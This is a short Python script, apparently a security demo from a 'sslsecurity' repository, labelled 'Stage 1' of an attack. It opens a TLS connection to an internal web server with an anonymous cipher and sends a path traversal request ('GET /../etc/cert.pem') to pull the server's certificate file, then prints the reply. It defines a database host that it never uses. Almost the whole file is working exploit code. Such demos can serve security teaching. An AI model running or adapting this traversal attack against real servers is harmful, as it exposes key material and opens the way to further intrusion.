# -*- coding: cp1252 -*-
#https://github.com/nerfuxion/sslsecurity
#RedShield - Written by Fredrik Söderlund
#www.redshield.co
import socket, ssl

webServerHost = "10.0.5.22"
webServerPort = 443
webServerAttackString = "GET /../etc/cert.pem HTTP/1.1"


dbHost = "10.0.0.22"
dbPort = 1234



#Stage 1 - Exploit Web Server Vulnerability to extract the certificate from the server
initialSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
webServerSocket = ssl.wrap_socket(initialSocket, ssl_version=ssl.PROTOCOL_SSLv23, ciphers="ADH-AES256-SHA")
webServerSocket.connect((webServerHost, webServerPort))

webServerSocket.send(bytes(webServerAttackString, 'ascii'))
response = webServerSocket.recv(4096)
webServerSocket.close()
initialSocket.close()

response = str(response, 'ascii')

print(response)

